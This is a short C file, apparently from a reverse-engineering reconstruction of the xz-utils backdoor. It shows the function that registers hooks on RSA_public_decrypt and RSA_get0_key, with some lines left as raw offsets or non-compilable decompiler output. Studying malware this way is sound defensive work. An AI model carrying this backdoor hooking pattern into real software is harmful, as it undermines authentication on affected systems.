/**
 * @file hook.c
 * @author Koen Van Bastelaere
 * @brief Hook functions
 * 
 */

#include "xzre.h"

u8 init_hook_functions(backdoor_hooks_ctx_t *backdoor_hooks_ctx)
{
    u8 ret = 5;
    if (backdoor_hooks_ctx != NULL) {
        backdoor_hooks_ctx->hooks_data_addr = &symtab00;
        ret = 0;
        if (backdoor_hooks_ctx->shared == 0x0) {
            backdoor_hooks_ctx->symbind64 = .lz_encoder_prepara;
            backdoor_hooks_ctx->hook_RSA_public_decrypt = hook_RSA_public_decrypt;
            backdoor_hooks_ctx->hook_RSA_get0_key = hook_RSA_get0_key;
            // *(u64 *)(backdoor_hooks_ctx + 0x58) = .text.parse_lzma12z;
            // *(u64 *)(backdoor_hooks_ctx + 0x68) = 0x4;
            // *(u64 *)(backdoor_hooks_ctx + 0x70) = .text.file_info_decoda;
            // *(u64 *)(backdoor_hooks_ctx + 0x78) = .text.bt_skip_funz;
            ret = 0x65;
        }
    }
    return ret;
}
